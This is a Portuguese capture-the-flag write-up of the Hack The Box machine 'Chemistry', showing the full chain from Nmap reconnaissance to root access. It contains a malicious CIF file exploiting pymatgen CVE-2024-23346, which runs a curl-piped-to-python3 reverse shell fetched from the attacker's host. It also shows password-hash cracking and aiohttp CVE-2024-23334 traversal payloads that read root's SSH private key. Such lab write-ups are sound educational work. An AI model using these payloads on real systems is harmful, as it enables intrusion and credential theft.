# Chemistry

## Resumo

Essa máquina expõe uma aplicação web que processa arquivos do tipo CIF. Para isso, ela utiliza uma biblioteca que é vulnerável à injeção de código arbitrário, o que me permitiu acesso inicial à máquina. Ao acessar a máquina, encontrei o arquivo de banco de dados da aplicação, o qual armazenava os usuários e seus hashes de senha em uma tabela. Extraindo a combinação de usuários e hashes, descobri a senha do usuário rosa, o qual utilizei para acesso remoto via SSH. Realizando um reconhecimento para escalar privilégios, encontrei uma porta escutando internamente, a qual encaminhei para minha máquina utilizando o SSH. Essa porta hospedava uma aplicação web que foi iniciada pelo usuário root. Analisando a aplicação, identifiquei uma vulnerabilidade no servidor utilizado (aiohttp), a qual permitiu a leitura arbitrária de arquivos do sistema, possibilitando extrair a chave privada do usuário root e obter acesso remoto privilegiado via SSH.

## Reconhecimento

Realizei uma varredura de serviços utilizando a ferramenta [Nmap](https://nmap.org):

```bash
# Nmap 7.92 scan initiated Sat Dec  7 11:00:51 2024 as: nmap -p- -sC -sV -vvv --min-rate=1000 -T2 -oA nmap/full <REDACTED>
Nmap scan report for <REDACTED>
Host is up, received reset ttl 63 (0.15s latency).
Scanned at 2024-12-07 11:00:51 -03 for 190s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 07 Dec 2024 14:02:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
<SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec  7 11:04:01 2024 -- 1 IP address (1 host up) scanned in 190.23 seconds
```

Os resultados identificaram 2 portas respondendo na máquina, sendo elas a porta `22` para acesso remoto via SSH e a porta `5000` que expõe um servidor HTTP. A porta 5000 retornou a seguinte página web no navegador:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistryhomepage.png" alt=""><figcaption><p>HTB Chemistry — Página inicial</p></figcaption></figure>

Utilizei a função de cadastro para me autenticar posteriormente e explorar os recursos da aplicação. Ao me autenticar, encontrei um dashboard:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistrydashboard.png" alt=""><figcaption><p>HTB Chemistry — Dashboard</p></figcaption></figure>

Esse página permite o upload de arquivos, e sugere que seja enviado um arquivo [CIF](https://www.ccdc.cam.ac.uk/community/access-deposit-structures/deposit-a-structure/guide-to-cifs/) válido. Além disso, é apresentado um arquivo de exemplo:

{% code title="http://<REDACTED>:5000/static/example.cif" %}
```crystal
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```
{% endcode %}

Pesquisando sobre esse tipo de arquivo, encontrei a [CVE-2024-23346](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) que explora uma vulnerabilidade na biblioteca [pymatgen](https://pymatgen.org/) ­para execução arbitrária de comandos ao processar arquivos CIF. Analisando o histórico de requisições no meu proxy, identifiquei que a aplicação está utilizando Python por meio do cabeçalho `Server`:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistryweb-app-python-server.png" alt=""><figcaption><p>HTB Chemistry — Cabeçalho Server da aplicação</p></figcaption></figure>

## Exploração

Portanto, tentei explorar essa vulnerabilidade com base nas instruções disponíveis no GitHub Security Advisory da CVE. Alterei o payload para que baixasse um script em Python da minha máquina e executasse uma shell reversa:

{% code title="exploit.cif" %}
```crystal
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl -L http://<REDACTED>:8000/reverse-shell.py | python3");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
{% endcode %}

Utilizei a funcionalidade de upload para enviar o arquivo, e ele foi listado logo na tabela abaixo. Ao selecionar a opção `View` na coluna `Actions`, recebi uma conexão reversa à minha máquina:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistryreverse-shell.png" alt=""><figcaption><p>HTB Chemistry — Acesso inicial</p></figcaption></figure>

## Pós exploração

### Usuário rosa

Logo após acessar a máquina, executei o comando `ls` o qual revelou um arquivo `database.db`.  Esse arquivo era um banco de dados SQLite, o qual baixei em minha máquina e consegui extrair uma combinação de usuários e seus hashes de senha em uma tabela `user`:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistrydumped-credentials.png" alt=""><figcaption><p>HTB Chemistry — Banco de dados SQLite</p></figcaption></figure>

Utilizando a ferramenta `john`, foi possível reverter a senha do usuário `rosa` e obter acesso SSH à máquina.

### Usuário root

Após obter acesso SSH à máquina, realizei um reconhecimento e identifiquei uma porta `8080` escutando localmente:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistryinternal-port.png" alt=""><figcaption><p>HTB Chemistry — Porta 8080 escutando internamente</p></figcaption></figure>

Encaminhei essa porta à minha máquina por meio do SSH:

```bash
ssh rosa@<REDACTED> -L 8888:127.0.0.1:8080
```

Acessei essa porta pelo navegador e ela retornou uma aplicação de monitoramento:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistrymonitoring-site.png" alt=""><figcaption><p>HTB Chemistry — Aplicação interna de monitoramento</p></figcaption></figure>

Essa aplicação é composta de conteúdo estático, e não é possível interagir ou enviar dados para ela. Analisando novamente as requisições em meu proxy, descobri o servidor que está sendo utilizado:

<figure><img src="../../../.gitbook/assets/ctfhtbchemistryvulnerable-aiohttp.png" alt=""><figcaption><p>HTB Chemistry — Servidor aiohttp vulnerável</p></figcaption></figure>

Pesquisando sobre essa versão do [aiohttp](https://docs.aiohttp.org/en/stable/index.html), encontrei a [CVE-2024-23334](https://github.com/wizarddos/CVE-2024-23334), a qual permite a leitura arbitrária de arquivos do servidor. Como essa aplicação foi iniciada pelo usuário root, é possível ler arbitrariamente qualquer arquivo do sistema. Portanto, tentei ler a chave privada do usuário root passando os seguintes parâmetros para o script:

```bash
python3 CVE-2024-23334.py -u http://127.0.0.1:8888 -f /root/.ssh/id_rsa -d /assets | wl-copy
```

E foi possível extrair a chave privada do usuário root, permitindo acesso remoto via SSH a ele:

<pre class="language-bash"><code class="lang-bash">[+] Attempt 0
                    Payload: /assets/../root/.ssh/id_rsa
        
                    Status code: 404
[+] Attempt 1
                    Payload: /assets/../../root/.ssh/id_rsa
        
                    Status code: 404
[+] Attempt 2

                    Payload: /assets/../../../root/.ssh/id_rsa
        
                    Status code: 200
Respose: 
-----BEGIN OPENSSH PRIVATE KEY-----
<strong>&#x3C;REDACTED>
</strong>-----END OPENSSH PRIVATE KEY-----

Exploit complete
</code></pre>

